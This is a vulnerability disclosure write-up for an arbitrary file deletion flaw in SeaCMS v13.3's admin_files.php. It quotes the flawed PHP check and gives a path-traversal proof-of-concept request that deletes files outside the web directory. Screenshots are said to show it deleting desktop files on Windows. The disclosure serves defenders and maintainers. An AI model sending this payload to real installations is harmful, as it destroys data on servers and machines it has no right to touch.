  admin_files.php    Arbitrary File Deletion

### Introduction

SeaCMS v13.3 has an arbitrary file deletion vulnerability. This vulnerability is caused by the fact that, despite the restrictions on the files to be deleted, the restrictions are still imperfect, allowing an attacker to arbitrarily delete files on the server, not limited to web directories, including arbitrary files on the server.

SeaCMS 官方网站： [SeaCMS - 开源免费 PHP 电影系统、电影 CMS、视频 CMS、电影 CMS、SEACMS](https://www.seacms.com/)

Click to download

![image-20250402105820409](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021122959.png)

You can see the latest version v13.3



### Vulnerability analysis and exploitation

The vulnerable code is located at : When that parameter is passed, there is no path traversal check, allowing the attacker to construct it themselves, which can be done by passing the following parameters

```
elseif($action=='del')
{
	if($filedir == '')
	{
		ShowMsg('未指定要删除的文件或文件名不合法', '-1');
		exit();
	}
	if(substr(strtolower($filedir),0,$dirlen)!=$dirTemplate){
		ShowMsg("只允许删除附件目录内的文件！","admin_files.php");
		exit;
	}
	$folder=substr($filedir,0,strrpos($filedir,'/'));
	if(!is_dir($folder)){
		ShowMsg("目录不存在！","admin_files.php");
		exit;
	}
	unlink($filedir);
	ShowMsg("操作成功！","admin_files.php?path=".$folder);
	exit;
}
```

We can construct filedir for directory traversal deletion

```
/4w8vn/admin_files.php?action=del&filedir=../uploads/../../../../../../test.txt
```

#### Exploit POC

We can create a new test file outside the web directory to do this

![image-20250402110149613](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021124951.png)

Then construct the parameters

![image-20250402110312376](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021124008.png)



![image-20250402110331373](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021124694.png)

Exploiting it, we can see that the file was successfully deleted

Now let's take it a step further and try to see if we can delete the rest of the files on Windows

![image-20250402110438361](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021124172.png)

![image-20250402110507564](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021124089.png)

We can see that the files on the desktop are also deleted successfully



In summary, an attacker can exploit this vulnerability to delete any file on the deployer's computer